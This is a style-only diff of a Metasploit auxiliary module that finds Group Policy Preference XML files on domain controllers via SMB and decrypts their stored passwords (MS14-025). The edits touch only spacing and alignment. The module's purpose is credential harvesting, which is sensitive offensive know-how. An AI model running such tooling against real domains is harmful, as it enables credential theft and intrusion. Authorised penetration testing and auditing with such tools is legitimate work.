@@ -3,7 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SMB::Client::Authenticated
   include Msf::Auxiliary::Scanner
@@ -12,32 +11,30 @@ class MetasploitModule < Msf::Auxiliary
 
   # Aliases for common classes
   SIMPLE = Rex::Proto::SMB::Client
-  XCEPT  = Rex::Proto::SMB::Exceptions
-  CONST  = Rex::Proto::SMB::Constants
+  XCEPT = Rex::Proto::SMB::Exceptions
+  CONST = Rex::Proto::SMB::Constants
 
   def initialize
     super(
-      'Name'        => 'SMB Group Policy Preference Saved Passwords Enumeration',
+      'Name' => 'SMB Group Policy Preference Saved Passwords Enumeration',
       'Description' => %Q{
         This module enumerates files from target domain controllers and connects to them via SMB.
         It then looks for Group Policy Preference XML files containing local/domain user accounts
         and passwords and decrypts them using Microsoft's public AES key. This module has been
         tested successfully on a Win2k8 R2 Domain Controller.
       },
-      'Author'      =>
-        [
-          'Joshua D. Abraham <jabra[at]praetorian.com>',
-        ],
-      'References'    =>
-        [
-          ['CVE', '2014-1812'],
-          ['MSB', 'MS14-025'],
-          ['URL', 'https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/d315342d-41c0-47e3-ab96-7039eb91f5b4'],
-          ['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html'],
-          ['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx'],
-          ['URL', 'https://labs.portcullis.co.uk/blog/are-you-considering-using-microsoft-group-policy-preferences-think-again/']
-        ],
-      'License'     => MSF_LICENSE,
+      'Author' => [
+        'Joshua D. Abraham <jabra[at]praetorian.com>',
+      ],
+      'References' => [
+        ['CVE', '2014-1812'],
+        ['MSB', 'MS14-025'],
+        ['URL', 'https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/d315342d-41c0-47e3-ab96-7039eb91f5b4'],
+        ['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html'],
+        ['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx'],
+        ['URL', 'https://labs.portcullis.co.uk/blog/are-you-considering-using-microsoft-group-policy-preferences-think-again/']
+      ],
+      'License' => MSF_LICENSE,
     )
     register_options([
       OptString.new('SMBSHARE', [true, 'The name of the share on the server', 'SYSVOL']),
@@ -61,7 +58,7 @@ class MetasploitModule < Msf::Auxiliary
       when 'STATUS_OBJECT_PATH_NOT_FOUND'
         vprint_error("Object PATH \\\\#{ip}\\#{datastore['SMBSHARE']}\\#{path} NOT found!")
       when 'STATUS_ACCESS_DENIED'
-       vprint_error("Host reports access denied.")
+        vprint_error("Host reports access denied.")
       when 'STATUS_BAD_NETWORK_NAME'
         vprint_error("Host is NOT connected to #{datastore['SMBDomain']}!")
       when 'STATUS_INSUFF_SERVER_RESOURCES'
@@ -121,7 +118,7 @@ class MetasploitModule < Msf::Auxiliary
   def parse_xml(ip, path, xml_file)
     mxml = xml_file[:xml]
     print_status "Parsing file: \\\\#{ip}\\#{datastore['SMBSHARE']}\\#{path}"
-    file_type = File.basename(xml_file[:path].gsub("\\","/"))
+    file_type = File.basename(xml_file[:path].gsub("\\", "/"))
     results = Rex::Parser::GPP.parse(mxml)
     tables = Rex::Parser::GPP.create_tables(results, file_type, xml_file[:domain], xml_file[:dc])
 
@@ -146,9 +143,9 @@ class MetasploitModule < Msf::Auxiliary
 
     path_elements = path.split('\\')
     ret_obj = {
-      :dc   => ip,
+      :dc => ip,
       :path => path,
-      :xml  => data
+      :xml => data
     }
     ret_obj[:domain] = path_elements[0]
 
@@ -195,8 +192,9 @@ class MetasploitModule < Msf::Auxiliary
       )
       sub_folders.each do |sub_folder|
         next if sub_folder == '.' || sub_folder == '..'
+
         gpp_locations.each do |gpp_l|
-          check_path(simple.address,"#{corp_domain}\\Policies\\#{sub_folder}\\#{gpp_l}")
+          check_path(simple.address, "#{corp_domain}\\Policies\\#{sub_folder}\\#{gpp_l}")
         end
       end
     rescue ::Exception => e
